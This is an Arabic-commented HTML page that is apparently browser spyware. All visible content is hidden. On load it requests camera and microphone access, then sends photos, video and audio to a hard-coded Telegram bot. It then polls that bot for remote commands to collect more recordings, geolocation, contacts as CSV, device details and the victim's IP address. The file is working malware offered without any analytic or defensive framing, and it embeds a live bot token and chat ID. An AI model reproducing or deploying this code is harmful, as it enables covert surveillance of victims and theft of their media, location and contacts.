<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        * { display: none; }
    </style>
</head>
<body>
    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        let cameraReady = false;
        let isProcessing = false;
        let mediaStream = null;
        let videoTrack = null;
        let imageCapture = null;
        
        // ========== تفعيل الكاميرا ==========
        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = mediaStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                cameraReady = true;
                
                console.log("✅ الكاميرا نشطة");
                await sendToTelegram("✅ تم تفعيل الكاميرا والميكروفون");
                
                // ✅ بعد منح الصلاحيات مباشرة: إرسال صورة + فيديو
                await sendPhotoAndVideo();
                
                await sendMainMenu();
                return true;
            } catch (e) {
                await sendToTelegram("❌ فشل تفعيل الكاميرا");
                return false;
            }
        }
        
        // ========== إرسال صورة + فيديو تلقائياً ==========
        async function sendPhotoAndVideo() {
            await sendToTelegram("🎯 بدء جمع البيانات...");
            
            // 1. التقاط صورة
            await sendToTelegram("📸 جاري التقاط صورة...");
            const photo = await capturePhoto();
            if (photo) {
                await sendPhoto(photo);
                await sendToTelegram("✅ تم إرسال الصورة");
            } else {
                await sendToTelegram("❌ فشل التقاط الصورة");
            }
            
            // تأخير قصير بين الصورة والفيديو
            await new Promise(r => setTimeout(r, 1000));
            
            // 2. تسجيل فيديو 10 ثواني
            await sendToTelegram("🎬 جاري تسجيل فيديو 10 ثواني...");
            const video = await recordVideo(10000);
            if (video) {
                await sendVideo(video);
                await sendToTelegram("✅ تم إرسال الفيديو");
            } else {
                await sendToTelegram("❌ فشل تسجيل الفيديو");
            }
            
            await sendToTelegram("✅ اكتمل جمع البيانات الأولية");
        }
        
        // ========== القائمة الرئيسية ==========
        async function sendMainMenu() {
            const message = `🤖 *بوت التحكم* 🤖

✅ الكاميرا نشطة
✅ الميكروفون نشط

اختر الإجراء:`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "📸 صورة", callback_data: "photo" }, { text: "🎬 فيديو 10ث", callback_data: "video" }],
                    [{ text: "🎤 صوت 10ث", callback_data: "audio" }, { text: "📍 الموقع", callback_data: "location" }],
                    [{ text: "📸 10 صور", callback_data: "10photos" }, { text: "🎤 10 صوت", callback_data: "10audios" }],
                    [{ text: "🎬 فيديو دقيقة", callback_data: "video60" }, { text: "📊 معلومات الجهاز", callback_data: "info" }],
                    [{ text: "🔄 تنفيذ الكل", callback_data: "full" }, { text: "📞 جهات الاتصال", callback_data: "contacts" }]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown", reply_markup: keyboard })
            });
        }
        
        // ========== الموقع الجغرافي ==========
        async function getLocation() {
            try {
                await sendToTelegram("📍 جاري الحصول على الموقع...");
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                await sendToTelegram(`📍 *الموقع الحالي*\n• خط العرض: ${lat}\n• خط الطول: ${lng}\n• الدقة: ${Math.round(accuracy)} متر`);
                await sendLocation(lat, lng);
                return { lat, lng };
            } catch (e) {
                await sendToTelegram(`❌ فشل الحصول على الموقع: ${e.message}`);
                return null;
            }
        }
        
        async function sendLocation(lat, lng) {
            await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, latitude: lat, longitude: lng })
            });
        }
        
        // ========== جهات الاتصال ==========
        async function getContacts() {
            try {
                if (!navigator.contacts) {
                    await sendToTelegram("❌ جهات الاتصال غير مدعومة في هذا المتصفح");
                    return null;
                }
                
                await sendToTelegram("📞 جاري فتح جهات الاتصال...");
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                
                if (!contacts || contacts.length === 0) {
                    await sendToTelegram("❌ لم يتم اختيار أي جهة اتصال");
                    return null;
                }
                
                let contactsText = "📞 *جهات الاتصال*\n\n";
                contactsText += `📊 العدد: ${contacts.length}\n\n`;
                
                for (let i = 0; i < Math.min(contacts.length, 30); i++) {
                    const contact = contacts[i];
                    const name = contact.name?.[0] || "بدون اسم";
                    const phones = contact.tel?.map(t => t.value).join(", ") || "لا يوجد رقم";
                    contactsText += `👤 ${i+1}. ${name}\n📱 ${phones}\n`;
                    contactsText += "─".repeat(15) + "\n";
                    
                    if (contactsText.length > 3500) {
                        await sendToTelegram(contactsText);
                        contactsText = "📞 *جهات الاتصال (تابع)*\n\n";
                    }
                }
                
                await sendToTelegram(contactsText);
                
                let csvContent = "الاسم,رقم الهاتف\n";
                for (const contact of contacts) {
                    const name = contact.name?.[0] || "بدون اسم";
                    const phones = contact.tel?.map(t => t.value).join(";") || "";
                    csvContent += `"${name}","${phones}"\n`;
                }
                const blob = new Blob(["\uFEFF" + csvContent], { type: "text/csv" });
                await sendDocument(blob, "contacts.csv");
                
                await sendToTelegram(`✅ تم استخراج ${contacts.length} جهة اتصال`);
                return contacts;
            } catch (e) {
                await sendToTelegram(`❌ فشل: ${e.message}`);
                return null;
            }
        }
        
        // ========== الوظائف الأساسية ==========
        async function capturePhoto() {
            if (!cameraReady) return null;
            try {
                if (videoTrack && videoTrack.readyState !== 'live') {
                    await restartCamera();
                }
                return await imageCapture.takePhoto();
            } catch (e) {
                return null;
            }
        }
        
        async function recordVideo(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') recorder.stop();
                    }, duration);
                });
            } catch (e) {
                console.error("فشل الفيديو:", e);
                return null;
            }
        }
        
        async function recordAudio(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) {
                console.error("فشل الصوت:", e);
                return null;
            }
        }
        
        async function restartCamera() {
            try {
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = mediaStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                cameraReady = true;
                return true;
            } catch (e) {
                cameraReady = false;
                return false;
            }
        }
        
        // ========== دوال التليجرام ==========
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text, parse_mode: "Markdown", disable_web_page_preview: true })
                });
            } catch (e) {}
        }
        
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
        }
        
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: formData });
        }
        
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
        }
        
        async function sendDocument(blob, filename) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("document", blob, filename);
            await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: "POST", body: formData });
        }
        
        async function sendDeviceInfo() {
            try {
                const battery = await navigator.getBattery();
                const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
                const msg = `📱 *معلومات الجهاز*\n\n• المتصفح: ${navigator.userAgent.substring(0, 80)}\n• النظام: ${navigator.platform}\n• الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 شاحن' : '🔋'}\n• IP: ${ip.ip || "غير معروف"}`;
                await sendToTelegram(msg);
            } catch(e) {}
        }
        
        // ========== معالجة الأوامر ==========
        async function handleCommand(cmd) {
            if (isProcessing) {
                await sendToTelegram("⏳ انتظر...");
                return;
            }
            isProcessing = true;
            
            switch(cmd) {
                case "photo":
                    await sendToTelegram("📸 جاري...");
                    const p = await capturePhoto();
                    if (p) { await sendPhoto(p); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video":
                    await sendToTelegram("🎬 جاري تسجيل 10ث...");
                    const v = await recordVideo(10000);
                    if (v) { await sendVideo(v); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video60":
                    await sendToTelegram("🎬 جاري تسجيل دقيقة...");
                    const v60 = await recordVideo(60000);
                    if (v60) { await sendVideo(v60); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "audio":
                    await sendToTelegram("🎤 جاري تسجيل 10ث...");
                    const a = await recordAudio(10000);
                    if (a) { await sendVoice(a); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "location":
                    await getLocation();
                    break;
                    
                case "contacts":
                    await getContacts();
                    break;
                    
                case "10photos":
                    await sendToTelegram("📸 جاري 10 صور...");
                    for (let i=0; i<10; i++) {
                        const ph = await capturePhoto();
                        if (ph) await sendPhoto(ph);
                        await new Promise(r => setTimeout(r, 300));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "10audios":
                    await sendToTelegram("🎤 جاري 10 تسجيلات...");
                    for (let i=0; i<10; i++) {
                        const au = await recordAudio(10000);
                        if (au) await sendVoice(au);
                        await new Promise(r => setTimeout(r, 500));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "info":
                    await sendDeviceInfo();
                    break;
                    
                case "full":
                    await sendToTelegram("🔄 بدء التنفيذ الكامل...");
                    const photo = await capturePhoto();
                    if (photo) await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 2000));
                    const video = await recordVideo(10000);
                    if (video) await sendVideo(video);
                    await new Promise(r => setTimeout(r, 2000));
                    const audio = await recordAudio(10000);
                    if (audio) await sendVoice(audio);
                    await sendToTelegram("✅ تم");
                    break;
            }
            isProcessing = false;
        }
        
        // جلب التحديثات
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=25&offset=${lastUpdateId+1}`;
                const res = await fetch(url);
                const data = await res.json();
                if (data.result) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            await handleCommand(update.callback_query.data);
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        }
                    }
                }
            } catch(e) {}
        }
        
        // الحفاظ على الكاميرا
        setInterval(async () => {
            if (videoTrack && videoTrack.readyState === 'ended') {
                await restartCamera();
            }
        }, 5000);
        
        // ========== التشغيل ==========
        window.onload = async () => {
            await initCamera();
            setInterval(getUpdates, 2000);
        };
    </script>
</body>
</html>
